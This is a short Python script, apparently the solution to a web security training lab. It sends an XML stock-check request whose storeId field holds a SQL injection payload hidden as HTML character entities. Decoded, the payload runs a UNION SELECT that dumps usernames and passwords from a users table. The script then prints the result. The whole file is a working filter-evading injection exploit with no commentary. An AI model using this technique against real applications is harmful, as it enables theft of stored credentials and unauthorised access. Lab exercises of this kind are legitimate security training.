#!/usr/bin/python3
##
import requests
import html
##
##
def get_passwd(URL):
    header={"Content-Type":"application/xml"}
    #
    send="<?xml version=\"1.0\" encoding=\"UTF-8\"?><stockCheck><productId>4</productId><storeId>&#54;&#57;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&apos;&#45;&apos;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;&#32;&#45;</storeId></stockCheck>"
    r=requests.post(URL,data=send,headers=header)
    return r.text
##
def main(URL):
    passwd=get_passwd(URL)
    print(passwd)
#
main('https://0ab100e403aed28c836ac93d00180037.web-security-academy.net/product/stock')